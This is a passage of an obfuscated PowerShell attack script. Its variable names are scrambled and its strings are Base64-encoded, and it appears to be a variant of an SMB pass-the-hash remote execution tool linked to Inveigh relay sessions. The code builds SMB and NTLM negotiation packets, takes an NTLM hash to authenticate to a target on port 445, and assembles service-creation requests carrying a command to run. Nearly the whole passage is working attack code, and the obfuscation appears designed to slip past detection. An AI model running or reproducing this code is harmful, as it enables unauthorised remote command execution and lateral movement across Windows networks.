        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMwA='))),${_10000110100100010})
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADMA'))),[Byte[]](0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADMA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADMA'))),[Byte[]](0x01,0x00,0x00,0x00))
    }
    if(${10110011110100111} -eq 3)
    {
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABUAHkAcABlAA=='))),[Byte[]](0x0a))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA'))),[Byte[]](0x02))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x97,0x82,0x08,0xe2))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10000111001100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAFYAZQByAHMAaQBvAG4A'))),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }
    return ${10000111001100000}
}
function _01000001100111110
{
    param([Byte[]]${_01111011000100011},[Int]${_10010011001100111},[Int]${_01110001011010001},[Int]${_10010111011000101},[Byte[]]${_01001000100000000},[Byte[]]${_10110100111010000},[Byte[]]${_00011001100010111},[Byte[]]${_01100111101000101})
    if(${_01110001011010001} -gt 0)
    {
        ${00101010101000101} = ${_01110001011010001} + ${_10010111011000101} + 8
    }
    [Byte[]]${10111011011110110} = [System.BitConverter]::GetBytes(${_10010011001100111} + 24 + ${00101010101000101} + ${_01100111101000101}.Length)
    [Byte[]]${00011110100110100} = ${10111011011110110}[0,1]
    [Byte[]]${00000100000111000} = [System.BitConverter]::GetBytes(${_10010011001100111} + ${_01100111101000101}.Length)
    [Byte[]]${10001111100000101} = ([System.BitConverter]::GetBytes(${_01110001011010001}))[0,1]
    ${10100010100100100} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x00))
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),${_01111011000100011})
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${00011110100110100})
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),${10001111100000101})
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${_01001000100000000})
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA'))),${00000100000111000})
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_10110100111010000})
    ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAG4AdQBtAA=='))),${_00011001100010111})
    if(${_01100111101000101}.Length)
    {
        ${10100010100100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))),${_01100111101000101})
    }
    return ${10100010100100100}
}
function _01110100101100000
{
    param ([Byte[]]${_01101000101101110},[Byte[]]${_10011011001100001})
    ${00100001010000101} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
    ${00100001010000101} = ${00100001010000101}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
    ${00100001010000101} += 0x00,0x00
    ${00011110111000111} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
    ${00011110111000111} = ${00011110111000111}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
    ${00011110111000111} += 0x00,0x00
    ${01110100011100001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),${00100001010000101})
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_10011011001100001})
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_10011011001100001})
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBOAGEAbQBlAA=='))),${_01101000101101110})
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),${00011110111000111})
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8ATgBhAG0AZQBNAGEAeABDAG8AdQBuAHQA'))),[Byte[]](0x0f,0x00,0x00,0x00))
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8ATgBhAG0AZQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAF8ATgBhAG0AZQBBAGMAdAB1AGEAbABDAG8AdQBuAHQA'))),[Byte[]](0x0f,0x00,0x00,0x00))
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBiAGEAcwBlAA=='))),[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0xbf,0xbf))
    ${01110100011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0x3f,0x00,0x00,0x00))
    return ${01110100011100001}
}
function _10001001111111011
{
    param([Byte[]]${_01011010111011111},[Byte[]]$Service,[Byte[]]${_10010011001100111},[Byte[]]$Command,[Byte[]]${_01101000111010010})
    ${00000101001110000} = [String](1..2 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
    ${00000101001110000} = ${00000101001110000}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
    ${00000101001110000} += 0x00,0x00
    ${10111100100100101} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_01011010111011111})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_10010011001100111})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_10010011001100111})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))),$Service)
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8AUgBlAGYAZQByAGUAbgB0AEkARAA='))),${00000101001110000})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_10010011001100111})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_10010011001100111})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))),$Service)
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMATQBhAHMAawA='))),[Byte[]](0xff,0x01,0x0f,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBUAHkAcABlAA=='))),[Byte[]](0x10,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBTAHQAYQByAHQAVAB5AHAAZQA='))),[Byte[]](0x03,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBFAHIAcgBvAHIAQwBvAG4AdAByAG8AbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAF8ATQBhAHgAQwBvAHUAbgB0AA=='))),${_01101000111010010})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAF8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAF8AQQBjAHQAdQBhAGwAQwBvAHUAbgB0AA=='))),${_01101000111010010})
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlAA=='))),$Command)
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAGcASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHAAZQBuAGQAUwBpAHoAZQA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByADMA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBVAEwATABQAG8AaQBuAHQAZQByADQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111100100100101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAFMAaQB6AGUA'))),[Byte[]](0x00,0x00,0x00,0x00))
    return ${10111100100100101}
}
function _01100100100100010
{
    param([Byte[]]${_01011010111011111})
    ${10101101010011001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10101101010011001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_01011010111011111})
    ${10101101010011001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    return ${10101101010011001}
}
function _01111110000001000
{
    param([Byte[]]${_01011010111011111})
    ${00100000001010011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00100000001010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_01011010111011111})
    return ${00100000001010011}
}
function _10111000000001000
{
    param([Byte[]]${_01011010111011111})
    ${10110010111100100} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10110010111100100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABIAGEAbgBkAGwAZQA='))),${_01011010111011111})
    return ${10110010111100100}
}
function _10100111110110000
{
    param ([Byte[]]${_01000011110001010})
    if([System.BitConverter]::ToString(${_01000011110001010}) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
    {
        ${01001100010000110} = $true
    }
    return ${01001100010000110}
}
function _10111000101010101
{
    param ([Int]${_10000101101111001},[Byte[]]${_01100111101000101})
    ${00011100110111001} = [System.BitConverter]::ToUInt16(${_01100111101000101}[${_10000101101111001}..(${_10000101101111001} + 1)],0)
    return ${00011100110111001}
}
if($hash -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgA6ACoA'))))
{
    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)
}
if($Domain)
{
    ${10110000100011001} = $Domain + "\" + $Username
}
else
{
    ${10110000100011001} = $Username
}
if($PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA=')))))
{
    ${10011100100001011} = $true
}
if($PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgA=')))))
{
    if(!$Inveigh)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
        ${00001110010100111} = $true
    }
    elseif(!$inveigh.session_socket_table[$session].Connected)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAUgBlAGwAYQB5ACAAcwBlAHMAcwBpAG8AbgAgAG4AbwB0ACAAYwBvAG4AbgBlAGMAdABlAGQA')))
        ${00001110010100111} = $true
    }
    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString
}
${01100101101011101} = [System.Diagnostics.Process]::GetCurrentProcess() | select -expand id
${01100101101011101} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${01100101101011101}))
[Byte[]]${01100101101011101} = ${01100101101011101}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
if(!${10011100100001011})
{
    ${00001110111101110} = New-Object System.Net.Sockets.TCPClient
    ${00001110111101110}.Client.ReceiveTimeout = 60000
}
if(!${00001110010100111} -and !${10011100100001011})
{
    try
    {
        ${00001110111101110}.Connect($Target,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA'))))
    }
    catch
    {
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAFQAYQByAGcAZQB0ACAAZABpAGQAIABuAG8AdAAgAHIAZQBzAHAAbwBuAGQA')))
    }
}
if(${00001110111101110}.Connected -or (!${00001110010100111} -and $inveigh.session_socket_table[$session].Connected))
{
    ${00111000010101001} = New-Object System.Byte[] 1024
    if(!${10011100100001011})
    {
        ${01110010010100001} = ${00001110111101110}.GetStream()
        if(${00110011011100110} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))))
        {
            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
        }
        else
        {
            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
        }
        while(${10010010100101111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
        {
            try
            {
                switch (${10010010100101111})
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIA')))
                    {
                        ${10110100100110010} = _10110010011100000 0x72 0x18 0x01,0x48 0xff,0xff ${01100101101011101} 0x00,0x00
                        ${00111111110011001} = _10010011000010011 ${00110011011100110}
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        try
                        {    
                            ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                            ${01110010010100001}.Flush()
                            ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                            if([System.BitConverter]::ToString(${00111000010101001}[4..7]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBmAC0ANQAzAC0ANABkAC0ANAAyAA=='))))
                            {
                                ${00110011011100110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA=')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                                if([System.BitConverter]::ToString(${00111000010101001}[39]) -eq '0f')
                                {
                                    if(${00111111001101100})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAHQAYQByAGcAZQB0AA==')))
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {
                                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                        ${00100000101110000} = $true
                                        ${01111000010110111} = 0x00,0x00
                                        ${01111011110001111} = 0x15,0x82,0x08,0xa0
                                    }
                                }
                                else
                                {
                                    if(${00111111001101100})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAdABhAHIAZwBlAHQA')))
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {
                                        ${00100000101110000} = $false
                                        ${01111000010110111} = 0x00,0x00
                                        ${01111011110001111} = 0x05,0x82,0x08,0xa0
                                    }
                                }
                            }
                            else
                            {
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                                if([System.BitConverter]::ToString(${00111000010101001}[70]) -eq '03')
                                {
                                    if(${00111111001101100})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAHQAYQByAGcAZQB0AA==')))
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {
                                        if(${00111111001101100})
                                        {
                                            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                        }
                                        ${00100000101110000} = $true
                                        ${01111000010110111} = 0x00,0x00
                                        ${01111011110001111} = 0x15,0x82,0x08,0xa0
                                    }
                                }
                                else
                                {
                                    if(${00111111001101100})
                                    {
                                        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIABuAG8AdAAgAHIAZQBxAHUAaQByAGUAZAAgAG8AbgAgACQAdABhAHIAZwBlAHQA')))
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                    }
                                    else
                                    {
                                        ${00100000101110000} = $false
                                        ${01111000010110111} = 0x00,0x00
                                        ${01111011110001111} = 0x05,0x80,0x08,0xa0
                                    }
                                }
                            }
                        }
                        catch
                        {
                            if($_.Exception.Message -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AIABjAGEAbABsAGkAbgBnACAAIgBSAGUAYQBkACIAIAB3AGkAdABoACAAIgAzACIAIABhAHIAZwB1AG0AZQBuAHQAKABzACkAOgAgACIAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAZABhAHQAYQAgAGYAcgBvAG0AIAB0AGgAZQAgAHQAcgBhAG4AcwBwAG8AcgB0ACAAYwBvAG4AbgBlAGMAdABpAG8AbgA6ACAAQQBuACAAZQB4AGkAcwB0AGkAbgBnACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHcAYQBzACAAZgBvAHIAYwBpAGIAbAB5ACAAYwBsAG8AcwBlAGQAIABiAHkAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAaABvAHMAdAAuACIA'))))
                            {
                                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAE0AQgAxACAAbgBlAGcAbwB0AGkAYQB0AGkAbwBuACAAZgBhAGkAbABlAGQA')))
                                ${10011011111011001} = $true
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAUwBNAEIAMgA=')))
                    {
                        if(${00110011011100110} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))))
                        {
                            ${00101000011001000} = 0
                        }
                        else
                        {
                            ${00101000011001000} = 1
                        }
                        ${10110001011111111} = 0x00,0x00,0x00,0x00
                        ${10110101111010011} = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        ${00111111111000101} = _00110110101000101 0x00,0x00 0x00,0x00 $false ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                        ${01110101111101001} = _00111001001001110
                        ${10001010110110010} = _01011001101010110 ${00111111111000101}
                        ${01111101001100100} = _01011001101010110 ${01110101111101001}
                        ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABOAGUAZwBvAHQAaQBhAHQAZQA=')))
                        if([System.BitConverter]::ToString(${00111000010101001}[70]) -eq '03')
                        {
                            if(${00111111001101100})
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIABvAG4AIAAkAHQAYQByAGcAZQB0AA==')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                if(${00111111001101100})
                                {
                                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAE0AQgAgAHMAaQBnAG4AaQBuAGcAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQA')))
                                }
                                ${00100000101110000} = $true
                                ${01111000010110111} = 0x00,0x00
                                ${01111011110001111} = 0x15,0x82,0x08,0xa0
                            }
                        }
                        else
                        {
                            if(${00111111001101100})
                            {
